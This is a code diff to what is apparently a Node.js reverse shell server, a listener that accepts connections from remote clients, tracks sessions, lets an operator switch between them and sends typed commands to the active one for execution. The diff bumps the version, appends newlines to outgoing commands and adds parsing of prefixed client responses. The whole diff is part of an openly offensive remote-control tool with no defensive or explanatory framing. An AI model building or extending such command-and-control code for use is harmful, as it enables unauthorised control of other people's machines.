@@ -37,7 +37,7 @@ class ShellServer {
     this.readLine.on("line", line => this.onReadLine.call(this, line));
 
     this.server.listen(port);
-    writeln(FgWhite + "Reverse Shell Server v1.1 - listening on port:" + port);
+    writeln(FgWhite + "Reverse Shell Server v1.2 - listening on port:" + port);
     writeln(
       "CmdLine - enter:\n@ - to list all connected sessions\n@n - to switch to session number\n@exit - to exit\n"
     );
@@ -87,9 +87,9 @@ class ShellServer {
       return;
     }
 
-    // no special command in input line
+    // no special command in input line, send command do client
     if (!line.startsWith("@")) {
-      this.sessionsDict[this.activeSession].write(line);
+      this.sessionsDict[this.activeSession].write(line + "\n");
       return;
     }
 
@@ -120,6 +120,22 @@ class ShellServer {
     if (sessionId == 0) write(color + "[-no-sessions-] ");
     else write(color + "[" + sessionId.toString() + "] ");
   }
+
+  /**
+   * Process input received from client
+   * @param {integer} sessionId
+   * @param {string} prefix - prefix of input
+   * @param {string} content - content of input
+   */
+  processReceivedLine(sessionId, prefix, content) {
+    if (prefix === "cmd") {
+      this.printSessionPrefix(FgYellow, sessionId);
+      process.stdout.write(prefix + "---" + content + "\n");
+    } else {
+      process.stdout.write("unknown client response:" + prefix);
+    }
+  }
+
   /**
    * Called on socket received data
    * @param {integer} sessionId
@@ -128,9 +144,16 @@ class ShellServer {
   onReceivedData(sessionId, data) {
     const lines = data.toString().split("\n");
     for (let index = 0; index < lines.length; index++) {
-      this.printSessionPrefix(FgYellow, sessionId);
+      // get line prefix
       // lines contains '\r' char inside - caret return, which might cause side effects
-      process.stdout.write(lines[index].replace("\r", "") + "\n");
+
+      const completeLine = lines[index].replace("\r", "");
+      if (completeLine.length == 0) continue;
+      const endOfPrefix = completeLine.substr(1).indexOf("@");
+      const currentLinePrefix = completeLine.substr(1, endOfPrefix);
+      const currentLine = completeLine.substr(endOfPrefix + 2);
+
+      this.processReceivedLine(sessionId, currentLinePrefix, currentLine);
     }
     this.printInputReady();
   }
